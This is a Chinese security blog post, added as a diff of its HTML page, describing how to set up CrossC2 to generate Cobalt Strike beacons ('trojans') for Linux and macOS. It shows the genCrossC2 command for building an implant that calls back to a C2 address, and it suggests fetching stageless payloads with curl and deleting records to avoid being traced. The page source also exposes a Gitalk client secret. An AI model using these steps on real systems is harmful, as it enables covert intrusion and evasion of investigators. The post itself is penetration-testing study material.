@@ -1,0 +1,74 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CobaltStrike：CrossC2相关知识"><meta name="keywords" content="渗透测试,CobaltStrike"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>CobaltStrike：CrossC2相关知识 | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  hexoVersion: '5.1.1'
+} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">52</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">CobaltStrike：CrossC2相关知识</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-20</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">449</span><span class="post-meta__separator">|</span><span>Reading time: 1 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote>
+<p>今天和亮亮还有豪哥提了下CS，发现我连CrossC2都还没装。。。有时候真心建议去看官方文档，别去找教程，看了几个教程全tm都是坑。。。</p>
+</blockquote>
+<a id="more"></a>
+
+<p>具体介绍看下面</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md">https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md</a></p>
+<p>一些限制，要cs4.1及以上。</p>
+<ul>
+<li>Only CS 4.x (&gt;=4.1) version is supported, lower versions will no longer be supported.</li>
+</ul>
+<p>简单说，CrossC2就是一个跨平台的上线，Linux、MacOS、iOS、Android。</p>
+<blockquote>
+<p>CrossC2 framework - 生成CobaltStrike的跨平台beacon</p>
+</blockquote>
+<ul>
+<li>由于 Cross C2目前只支持HTTPS Beacon，所以在Listenrs中选择HTTPS进行监听，<br>服务端开启监听 windows/beacon_https/reverse_https 类型的beacon（强制HTTPS</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120221604.png"></p>
+<p>如何使用？</p>
+<ol>
+<li>将s端的<code>.cobaltstrike.beacon_keys</code> 下载到c端目录下。</li>
+</ol>
+<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210120223900346.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120224454.png"></p>
+<ol start="2">
+<li>将CrossC2.cna、genCrossC2.Linux两个文件复制到Cobalt Strike服务端（必须处于同一目录）</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120233334.png"></p>
+<p>根据目标客户端，利用相应的CrossC2文件，生成上线文件（可执行文件，需要给x权限）</p>
+<p>测试：以kali来测试。</p>
+<p>生成上线可执行文件(木马)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[usage]: .&#x2F;genCrossC2.Linux [host] [port] [getURI] [postURI] [platform] [arch] [outputFileName]</span><br><span class="line"></span><br><span class="line">         -platform        &#39;MacOS&#39; &#x2F; &#39;Linux&#39;</span><br><span class="line">         -arch            &#39;x86&#39; &#x2F; &#39;x64&#39;</span><br><span class="line"></span><br><span class="line">[ex]:    .&#x2F;genCrossC2.Linux 10.10.10.10 40443 null null Linux x64 C2</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上面这个都是老方法，非常不推荐。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121004040.png"></p>
+<p>要记得给<code>genCrossC2.MacOS</code>  x 权限，不然没办法。。我傻逼，在这里都能卡住。</p>
+<p>然后在kali 上运行可执行文件(木马)</p>
+<ul>
+<li>拿到shell之后，上传生成的可执行文件，然后运行</li>
+<li>Stageless，命令行curl远程加载即可，不过这样可能会注意一下删除记录，否则如意被溯源</li>
+</ul>
+<p>我还问了下long716师傅，为什么Stageless 这种不行，结果我换个端口就好了。傻逼了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005007.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121003919.png"></p>
+<p>成功上线。</p>
+<p>当然不仅仅这些。</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/67f2.html">https://hack-for.fun/67f2.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="next-post pull-right"><a href="/84a4.html"><span>必会技术：MacOS下如何对移动端APP抓包测试</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
+  clientID: '6ceed9c245da8d33222a',
+  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
+  repo: 'Gitalk',
+  owner: 'ifonly-go2019',
+  admin: 'ifonly-go2019',
+  id: md5(decodeURI(location.pathname)),
+  language: 'zh-CN'
+})
+gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
